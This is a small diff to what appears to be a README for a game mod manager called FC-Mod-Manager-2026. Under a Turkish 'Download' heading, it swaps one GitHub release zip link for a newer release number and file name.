@@ -12,7 +12,7 @@
 
 ## 📥 İndir
 
-**[FC-Mod-Manager-2026](https://github.com/AttoConjurer/FC-Mod-Manager-2026/releases/download/880/FCModManager26.zip)**
+**[FC-Mod-Manager-2026](https://github.com/AttoConjurer/FC-Mod-Manager-2026/releases/download/881/FCMOD26Manager.zip)**
 
 
 ---
